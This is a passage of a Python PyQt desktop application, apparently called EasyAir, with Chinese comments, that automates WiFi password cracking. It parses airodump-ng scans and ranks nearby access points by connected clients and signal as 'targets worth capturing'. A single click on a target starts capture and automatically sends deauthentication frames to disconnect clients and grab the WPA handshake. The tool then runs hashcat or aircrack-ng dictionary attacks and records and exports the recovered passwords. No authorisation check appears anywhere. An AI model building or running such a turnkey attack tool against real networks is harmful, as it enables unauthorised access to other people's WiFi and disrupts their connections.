                self._warn_no_aps()

        csv = self._find_latest_csv()
        if not csv:
            return
        try:
            st = csv.stat()
        except OSError:
            return
        sig = (str(csv), st.st_mtime_ns, st.st_size)
        if sig == self._last_csv and not force:
            return
        self._last_csv = sig
        try:
            txt = csv.read_text(errors="ignore", encoding="utf-8")
            # airodump CSV 分两段: AP 段 + Station 段, 以 "Station MAC" 表头分隔
            if "Station MAC" in txt:
                ap_sec, station_sec = txt.split("Station MAC", 1)
            else:
                ap_sec, station_sec = txt, ""
            stations_by_bssid = self._parse_station_section(station_sec)
            rows = self._parse_ap_csv(ap_sec, stations_by_bssid)
            if rows:
                # setUpdatesEnabled(False) 必须配 finally 恢复, 否则刷新
                # 表格过程中一旦抛异常, 表格会永久停止重绘 —— 表现就是
                # 界面卡住甚至随窗口关闭而崩溃。
                self.ap_table.setUpdatesEnabled(False)
                try:
                    self._fill_ap_table(rows)
                finally:
                    self.ap_table.setUpdatesEnabled(True)
                self.scan_elapsed.setText(self._scan_elapsed_text())
                n_cli = sum(1 for r in rows if r[7])
                tip = f", {n_cli} 个有客户端" if n_cli else ""
                n_hid = getattr(self, "_hidden_ssids", 0)
                htip = f" · 已隐藏 {n_hid} 个隐藏SSID" if n_hid else ""
                self.set_status(f"发现 {len(rows)} 个 AP{tip}{htip} - 点击选择目标")
        except Exception as e:  # noqa: BLE001
            # 定时器槽里的异常只会被 PyQt 打印到控制台, 界面上看不出哪里错了。
            # 必须留完整栈, 否则"扫描中途闪退/状态不动"无从排查。
            self.log(f"[解析失败] {type(e).__name__}: {e}")
            import traceback
            self.log(traceback.format_exc().strip().replace("\n", " | "))

    def _fill_ap_table(self, rows):
        """把解析好的 AP 行写入表格(调用方负责 setUpdatesEnabled)。"""
        self.ap_table.setRowCount(len(rows))
        for i, r in enumerate(rows):
            # r = (信号数值, SSID, 客户端, BSSID, 信道, 加密, 强度, 客户端数)
            pwr_int = r[0]
            cli_count = r[7]
            for col, val in ((1, r[1]), (2, r[2]), (3, r[3]),
                             (4, r[4]), (5, r[5]), (6, r[6])):
                it = QTableWidgetItem(val)
                if col in (1, 3):
                    it.setToolTip(val)
                if col == 2:
                    it.setForeground(QColor("#1565c0") if cli_count
                                    else QColor("#b0bec5"))
                    it.setToolTip(self._client_tips.get(r[3], val))
                self.ap_table.setItem(i, col, it)
            bar, color = self._signal_bar(pwr_int)
            it = QTableWidgetItem(bar)
            it.setTextAlignment(Qt.AlignCenter)
            it.setForeground(QColor(color))
            self.ap_table.setItem(i, 0, it)

    # airodump-ng 的 CSV 表头随版本变化, 必须按列名映射而不是固定下标。
    # 1.6 实测表头: BSSID, First time seen, Last time seen, channel, Speed,
    # Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP,
    # ID-length, ESSID, Key  —— 与旧版 17 列格式列序完全不同。
    _CSV_ALIASES = {
        "bssid": ("bssid",),
        "essid": ("essid",),
        "ch": ("channel", "ch"),
        "enc": ("privacy", "enc"),
        "cipher": ("cipher",),
        "auth": ("authentication", "auth"),
        "power": ("power", "dbm", "signal"),
        "station": ("stationmac", "station"),
    }

    @staticmethod
    def _parse_station_section(station_sec: str) -> dict:
        """解析 airodump CSV 的 Station 段, 返回 {BSSID: [客户端...]}。

        实测格式(行尾带 \\r):
        Station MAC, First time seen, Last time seen, Power, # packets,
        BSSID, Probed ESSIDs
        未关联的客户端 BSSID 为 "(not associated)", 不计入任何 AP。
        """
        out = {}
        for raw in station_sec.splitlines():
            line = raw.strip().strip("\r")
            if not line or line.startswith(("Station MAC", "Interface")):
                continue
            parts = re.split(r',\s*', line)
            if len(parts) < 6:
                continue
            mac, power, packets, bssid = (parts[0].strip(), parts[3].strip(),
                                          parts[4].strip(), parts[5].strip().upper())
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac):
                continue
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue  # (not associated) 等
            out.setdefault(bssid, []).append(
                {"mac": mac.upper(), "power": power, "packets": packets})
        return out

    @staticmethod
    def _norm_col(name: str) -> str:
        n = name.strip().lower().lstrip("#").replace(" ", "")
        return n.replace("_", "").replace("-", "")

    def _parse_ap_csv(self, txt: str, stations_by_bssid=None):
        """按表头名解析 airodump CSV, 返回表格行列表"""
        if stations_by_bssid is None:
            stations_by_bssid = {}
        idx = {}
        rows = []
        hidden_count = 0
        self._client_tips = {}
        # airodump 的分隔符是 ", "，引号前多一个空格会使 CSV 规范失效，
        # 含逗号的 SSID(如 "Cafe, Guest") 会被切成两列。先归一化再解析。
        txt = re.sub(r",\s+(?=\")", ",", txt)
        # 整流解析: 逐行切分会破坏含逗号/换行的 SSID 字段
        for parts in csvmod.reader(io.StringIO(txt)):
            if not parts:
                continue

            norm = [self._norm_col(p) for p in parts]
            # 表头行: 含 bssid 且列数足够
            if "bssid" in norm and len(parts) > 2:
                idx = {}
                for field, aliases in self._CSV_ALIASES.items():
                    for a in aliases:
                        key = self._norm_col(a)
                        if key in norm:
                            idx[field] = norm.index(key)
                            break
                continue

            if not idx:
                continue

            def get(field):
                i = idx.get(field)
                if i is None or i >= len(parts):
                    return ""
                v = parts[i].strip()
                # airodump 对含逗号的 SSID 加引号, 且引号前可能有空格
                if len(v) >= 2 and v[0] == '"' and v[-1] == '"':
                    v = v[1:-1]
                return v.strip()

            bssid = get("bssid")
            # station 行(握手包捕获时)的 BSSID 为空, 跳过
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                continue

            ch = get("ch")
            priv = get("enc") or "Open"
            cipher = get("cipher")
            auth = ("WPA" if priv.startswith("WPA")
                    else "WEP" if priv.startswith("WEP") else priv)
            pwr = get("power")
            essid = get("essid")
            if not ch:
                ch = "-"
            if not essid:
                # 隐藏 SSID 不显示(按需求过滤), 但计数保留, 不静默丢失
                hidden_count += 1
                continue
            try:
                pwr_int = int(float(pwr))
                # airodump 用 -1 表示"尚未收到 beacon, 信号未知",
                # 不能当成 -1dBm 的最强信号排到最前
                if pwr_int >= 0 or pwr_int == -1:
                    pwr_int = None
            except (TypeError, ValueError):
                pwr_int = None
            enc_col = f"{priv}/{cipher}".strip("/") if cipher else priv
            # 客户端信息: 第 8 列(真实存在于 airodump CSV 的 Station 段)
            clients = stations_by_bssid.get(bssid.upper(), []) if stations_by_bssid else []
            client_count = len(clients)
            client_str = f"{client_count} 客户端"
            if client_count:
                # 列窄, 只显示数量; MAC 明细放 tooltip
                macs = ", ".join(c["mac"] for c in clients[:4])
                if client_count > 4:
                    macs += f" 等{client_count}个"
                client_str = f"{client_count} 台"
                client_tip = macs
            else:
                client_str = "-"
                client_tip = "无在线客户端"

            # 元组顺序 = 表格列序: 信号(数值), SSID, 客户端, BSSID, 信道,
            # 加密, 认证, 强度, 客户端数
            rows.append((pwr_int, essid, client_str, bssid.upper(), ch,
                         enc_col, f"{pwr} dBm" if pwr else "",
                         client_count))
            self._client_tips[bssid.upper()] = client_tip
        # 信号强的排前面(未知信号沉底)
        # 排序: 有客户端的排最前, 同组内信号强的排前, 未知信号沉底。
        # 优先展示"有人且信号好"的 AP, 这才是值得抓的目标。
        rows.sort(key=lambda r: (r[7] == 0, r[0] is None,
                                 -(r[0] if r[0] is not None else 0)))
        self._hidden_ssids = hidden_count
        return rows

    @staticmethod
    def _signal_bar(pwr_int):
        """信号格: 用方块字符画条, 返回(文本, 颜色)。"""
        if pwr_int is None:
            return "░░░░░", "#b0bec5"
        if pwr_int >= -50:
            return "█████", "#2e7d32"
        if pwr_int >= -60:
            return "████░", "#7cb342"
        if pwr_int >= -70:
            return "███░░", "#f9a825"
        if pwr_int >= -80:
            return "██░░░", "#ef6c00"
        return "█░░░░", "#c62828"

    def _on_ap_clicked(self, row, col):
        """单击即设为目标, 并立即开始抓握手包 —— 不再需要双击/再点按钮。"""
        if not self._select_target(row):
            return
        # 已有握手包则不重复抓, 避免误触就长时间占用网卡
        if self.lbl_handshake.text() not in ("未捕获", ""):
            self.set_status("该目标已有握手包，如需重抓请先停止当前抓包")
            return
        self._start_capture()

    def _select_target(self, row):
        if row < 0:
            return False
        def _get(col):
            it = self.ap_table.item(row, col)
            return it.text() if it else ""
        # 列序: 0信号 1SSID 2客户端 3BSSID 4信道 5加密 6强度
        essid = _get(1)
        bssid = _get(3)
        ch = _get(4)
        enc = _get(5)
        
        self.lbl_target_essid.setText(essid)
        self.lbl_target_bssid.setText(bssid)
        self.lbl_target_ch.setText(ch)
        self.lbl_target_enc.setText(enc)
        self.lbl_handshake.setText("未捕获")
        self.lbl_handshake.setStyleSheet("color: #c62828; font-weight: bold;")
        
        self.log(f"[目标] 已选择: {essid} ({bssid}) CH:{ch}")
        self.set_status(f"目标已锁定: {essid}")
        return True

    # ===== 抓包 =====
    def _toggle_scan(self):
        """扫描/停止合并为一个按钮。"""
        if self.scan_timer.isActive() or self._stopping_scan:
            self._stop_scan()
        else:
            self._start_scan()

    def _toggle_crack(self):
        """开始破解/停止破解合并为一个按钮。"""
        if self._crack_running:
            self._stop_crack()
        else:
            self._start_crack()

    def _start_capture(self):
        essid = self.lbl_target_essid.text()
        bssid = self.lbl_target_bssid.text()
        ch = self.lbl_target_ch.text()
        if essid == "未选择" or not bssid:
            QMessageBox.warning(self, "提示", "请先在左侧列表点击选择目标 AP")
            return

        if not self.mon_iface:
            # 监听没开就自动开, 不再要求用户先去顶部点一次
            self.log("[抓包] 监听模式未开启, 正在自动开启…")
            if not self._enable_monitor():
                QMessageBox.warning(self, "提示", "监听模式开启失败，请先开启监听模式")
                return

        self.log(f"[抓包] 目标: {essid} | {bssid} | CH{ch}")
        self.bottom_tabs.setCurrentWidget(self.log_scan_box)
        self.set_status("正在抓取握手包…")

        # 顺序很关键: 必须先让 airodump 开始抓包, 再发 deauth。
        # 反过来(先 deauth 后开抓)会漏掉客户端重连的那几帧 EAPOL,
        # 结果就是抓到的 cap 里没有握手包 —— 导入 eWSA 显示"无数据"。
        def _capture():
            proc = self.core.airodump_capture(
                self.mon_iface, bssid, ch, "handshake")
            if not proc:
                return None
            # 等 airodump 完成握手再发 deauth
            time.sleep(2.0)
            dp = self.core.deauth(self.mon_iface, bssid, 10)
            if dp:
                self.log(f"[deauth] 已自动发送 10 次解关联 → {bssid}")
            else:
                self.log("[deauth] 发送失败, 可能抓不到握手包")
            return proc

        self._run_worker(_capture, self._on_capture_started)

        self.cap_check_timer = QTimer(self)
        self.cap_check_timer.timeout.connect(self._check_handshake)
        self.cap_check_timer.setInterval(2000)
        self.cap_check_timer.start()

    def _on_capture_started(self, p):
        if not p:
            self.set_status("抓包启动失败")
            return
        self.cap_thread = self._spawn_cmd(p, self.log_scan)

    def _check_handshake(self):
        cap = self.core.get_latest_handshake()
        if cap:
            self.lbl_handshake.setText(f"握手包 {cap.name}")
            self.lbl_handshake.setStyleSheet("color: #2e7d32; font-weight: bold;")
            self.log(f"[成功] 已捕获握手包 → {cap.name}")
            self.bottom_tabs.setCurrentWidget(self.log_scan_box)
            self._refresh_cap_tree()
            self.set_status(f"握手包已捕获 · 可开始破解")
            if hasattr(self, 'cap_check_timer'):
                self.cap_check_timer.stop()

    def _auto_stop_monitor(self):
        if self.auto_monitor_enabled and self.mon_iface:
            self.log("[自动] 关闭监听模式...")
            mon = self.mon_iface
            self._run_worker(lambda: self.core.stop_monitor(mon),
                             lambda p: setattr(self, 'mon_iface', None))

    # ===== 破解 =====
    def _temp_limit(self) -> int:
        try:
            return int(self.core.config.get("hashcat_temp_limit", 85) or 0)
        except (TypeError, ValueError):
            return 0

    def _hwmon_args(self) -> str:
        tl = self._temp_limit()
        return f"--hwmon-temp-abort={tl}" if tl else ""

    def _resolve_cap(self) -> Optional[Path]:
        """优先用握手包库选中项，否则用最新握手包"""
        sel = self.cap_tree.selectedItems()
        if sel:
            cap = sel[0].data(0, Qt.UserRole)
            if cap and Path(cap).exists():
                return Path(cap)
        return self.core.get_latest_handshake()

    def _start_crack(self):
        cap = self._resolve_cap()
        if not cap:
            QMessageBox.warning(self, "提示", "未检测到握手包，请先抓取握手包")
            return
        wordlists = self.core.get_wordlists()
        if not wordlists:
            QMessageBox.warning(self, "提示", "请先在'字典管理'中添加字典文件")
            return

        essid = self.lbl_target_essid.text()
        bssid = self.lbl_target_bssid.text()

        tree = self._current_result_tree()
        self.current_crack_date = self._tab_date()
        self.current_crack_item = tree.add_target(bssid, essid, str(cap))
        self.current_crack_tree = tree
        idx = tree.indexOfTopLevelItem(self.current_crack_item)
        self.core.history_add(self.current_crack_date, tree.to_record(self.current_crack_item))
        self.result_tabs.setTabText(
            self.result_tabs.currentIndex(),
            f"{self.current_crack_date} ({tree.topLevelItemCount()})")
        tree.setCurrentItem(self.current_crack_item)
        self.log(f"[记录] 已写入 {self.current_crack_date} (第 {idx + 1} 条)")

        self.progress_bar.setValue(0)
        self.progress_bar.setVisible(True)
        self.lbl_progress.setText("正在启动破解...")
        self.btn_start_crack.setEnabled(True)
        self.btn_start_crack.setText("⏹ 停止破解")
        self.btn_start_crack.setStyleSheet(
            "font-weight: bold; background: #c62828; color: white;")
        self._crack_running = True
        self.crack_start_time = time.time()
        self.crack_timer.start()
        self.bottom_tabs.setCurrentWidget(self.log_crack_box)

        engine = self.core.config.get("crack_engine", "Hashcat (GPU/CPU)")
        if engine.startswith("Aircrack"):
            self.log_crack(f"> aircrack-ng '{cap}' -w '{wordlists[0]}'")
            self._run_worker(
                lambda: self.core.crack_aircrack(str(cap), wordlists[0]),
                self._on_crack_proc)
            self.log_crack("[破解中] Aircrack-ng 正在跑字典...")
        else:
            self._run_hashcat(str(cap), wordlists)

    def _on_crack_proc(self, p):
        self.crack_thread = self._spawn_cmd(
            p, self._on_crack_output, self._on_crack_finished)

    def _run_hashcat(self, cap, wordlists):
        self.log_crack("[Hashcat] 正在转换 .cap -> .hc22000...")
        self._run_worker(
            lambda: self.core.cap_to_hc22000(cap),
            lambda p: self._on_conv_proc(p, cap, wordlists))

    def _on_conv_proc(self, pconv, cap, wordlists):
        self.conv_thread = self._spawn_cmd(
            pconv, self.log_crack, lambda: self._on_conv_done(cap, wordlists))

    def _on_conv_done(self, cap, wordlists):
        hc = Path(cap).with_suffix(".hc22000")
        if not hc.exists():
            self.log_crack("[错误] hcxpcapngtool 转换失败")
            self._on_crack_finished()
            return
        self.log_crack(f"[转换完成] {hc}")
        device = self.core.config.get("crack_device", "GPU + CPU (自动)")
        use_gpu = device != "仅 CPU"
        extra = self.core.config.get("hashcat_extra_args", "")
        self.log_crack(
            f"> hashcat -m 22000 {'-D 1,2' if use_gpu else '-D 1'} {self._hwmon_args()}"
            f" {extra} '{hc}' {' '.join(wordlists)}")
        tl = self._temp_limit()
        if tl:
            self.log_crack(f"[保护] GPU 温度上限 {tl}°C，达到即自动中止")
        self._run_worker(
            lambda: self.core.crack_hashcat(str(hc), wordlists, use_gpu, extra, tl),
            self._on_crack_proc)
        self._sync_record_buttons()
        self.log_crack("[破解中] Hashcat 正在跑字典...")

    def _on_crack_output(self, line):
        self.log_crack(line)
        if "KEY FOUND" in line or "FOUND" in line.upper():
            match = re.search(r'\[(.*?)\]', line) or re.search(r'KEY FOUND.*?(\S+)', line)
            if match:
                self._update_record(match.group(1))
                return
            self._update_record(line.strip())
            return

        m = re.search(r'(\d+\.\d+)%', line)
        if m:
            self.progress_bar.setValue(int(float(m.group(1))))
        if "speed" in line.lower() or "速度" in line:
            m = re.search(r'([\d]+(?:\.\d+)?\s*[kMG]?H/s)', line)
            if m:
                self.lbl_progress.setText(
                    f"破解中... 已耗时: {self._format_elapsed(self.crack_start_time)} | 速度 {m.group(1)}"
                )

    def _update_record(self, password):
        tree = getattr(self, 'current_crack_tree', None)
        if not tree or not self.current_crack_item:
            return
        tree.update_progress(self.current_crack_item, password,
                             self._format_elapsed(self.crack_start_time))
        self._persist_record()

    def _persist_record(self):
        """落盘破解进度。history.json 是整文件读写, 所以由 _update_crack_timer
        节流到最多每 5s 调一次; 交互操作(备注/开始/结束/退出)直接调用本函数。"""
        tree = getattr(self, 'current_crack_tree', None)
        if not tree or not self.current_crack_item:
            return
        # tree 可能已被重建(如批量添加/清空后切换 tab), 此时旧 item 失效,
        # 直接对 C++ 对象取 indexOfTopLevelItem 会抛 RuntimeError
        try:
            index = tree.indexOfTopLevelItem(self.current_crack_item)
        except RuntimeError:
            self.current_crack_item = None
            return
        if index < 0:
            return
        self._last_persist = time.time()
        self.core.history_update(self.current_crack_date, index,
                                 tree.to_record(self.current_crack_item))

    def _update_crack_timer(self):
        elapsed = self._format_elapsed(self.crack_start_time)
        self.lbl_progress.setText(f"破解中 · {elapsed}")
        tree = getattr(self, 'current_crack_tree', None)
        if tree and self.current_crack_item:
            tree.update_progress(self.current_crack_item, None, elapsed)
            if time.time() - self._last_persist >= 5.0:
                self._persist_record()

    def _countdown_num(self) -> int:
        """以扫描启动瞬间为锚, 返回严格递减的倒计时秒数。

        锚点只在开始扫描时算一次, 之后用 elapsed 整除得到秒数,
        这样每个数字恰好停留 1 秒, 不会出现跳秒或回跳。"""
        if not self._cd_anchor_left:
            return 0
        elapsed = time.time() - self.scan_start_time
        # _cd_anchor_left 是开始时的剩余秒数(整数)。
        # 向上取整: t=0 显示满值(6), t=1 显示 5 ... 每个数字正好停 1 秒。
        # 用 int() 会立刻少 1 格, 起步就错位。
        left = self._cd_anchor_left - elapsed
        n = -int(-left // 1)  # 等价 math.ceil, 避免多 import
        return n if n > 1 else 1

    def _tick_scan_clock(self):
        """仅刷新时长与倒计时(200ms), 不做任何解析或 IO。

        计时基于 time.time() 差值而非累加, 因此即使个别 tick 被拖慢
        或丢失, 下一帧会自动校正, 不会越走越偏或出现跳秒。
        """
        if not self.scan_start_time:
            return
        # 200ms 一次的 tick 里绝大多数时候文本没变(如倒计时 5->5->5)。
        # 无条件 setText 会白白触发重绘, 这是扫描时界面卡顿的主因之一。
        txt = self._scan_elapsed_text()
        if txt != self._last_clock_text:
            self._last_clock_text = txt
            self.scan_elapsed.setText(txt)
        if self.scan_deadline and time.time() >= self.scan_deadline:
            # 本槽每 200ms 进一次, 不置位会重复触发停止流程
            if getattr(self, "_autostop_firing", False):
                return
            self._autostop_firing = True
            self._stop_scan()

    def _format_elapsed(self, start):
        elapsed = max(0, int(time.time() - start))
        h, rem = divmod(elapsed, 3600)
        m, s = divmod(rem, 60)
        return f"{h:02d}:{m:02d}:{s:02d}"

    def _on_crack_finished(self):
        self.crack_timer.stop()
        self.progress_bar.setVisible(False)
        self._sync_record_buttons()
        self.btn_start_crack.setEnabled(True)
        self.btn_start_crack.setText("▶ 开始破解")
        self.btn_start_crack.setStyleSheet(
            "font-weight: bold; background: #2e7d32; color: white;")
        self._crack_running = False

        tree = getattr(self, 'current_crack_tree', None)
        if tree and self.current_crack_item:
            pwd = self.current_crack_item.text(CrackResultWidget.COL_PWD)
            if not pwd or pwd == "破解中...":
                tree.set_failed(self.current_crack_item, "未找到密码")
            self._persist_record()

        self.lbl_progress.setText("破解完成")
        self.set_status("破解任务结束")
        self.log_crack("[完成] 破解任务结束")

    def _stop_crack(self):
        self._crack_running = False
        if self.crack_thread:
            self.crack_thread.stop()
            self.crack_thread = None
        if self.conv_thread:
            self.conv_thread.stop()
            self.conv_thread = None
        self.crack_timer.stop()
        self.progress_bar.setVisible(False)
        self._sync_record_buttons()
        self.btn_start_crack.setEnabled(True)
        self.btn_start_crack.setText("▶ 开始破解")
        self.btn_start_crack.setStyleSheet(
            "font-weight: bold; background: #2e7d32; color: white;")
        self._crack_running = False
        tree = getattr(self, 'current_crack_tree', None)
        if tree and self.current_crack_item:
            tree.set_failed(self.current_crack_item, "已停止")
            self._persist_record()
        self.log_crack("[已停止] 破解已终止")
        self.set_status("破解已停止")

    def _export_results(self):
        fn, _ = QFileDialog.getSaveFileName(
            self, "导出结果",
            str(Path.home() / "easyair_results.csv"), "CSV Files (*.csv)")
        if not fn:
            return
        try:
            with open(fn, 'w', encoding='utf-8', newline='') as f:
                f.write("日期,BSSID,SSID,密码,握手包,状态,耗时,备注\n")
                for date in self.core.history_dates():
                    for rec in self.core.history_records(date):
                        f.write(",".join([
                            date, rec.get("bssid", ""), rec.get("essid", ""),
                            rec.get("password", ""), rec.get("cap", ""),
                            rec.get("status", ""), rec.get("elapsed", ""),
                            f'"{rec.get("note", "")}"',
                        ]) + "\n")
            QMessageBox.information(self, "成功", f"已导出到: {fn}")
            self.log(f"[导出] 结果已保存到: {fn}")
        except OSError as e:
            QMessageBox.warning(self, "错误", f"导出失败: {e}")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = EasyAirApp()
    win.show()
    sys.exit(app.exec())
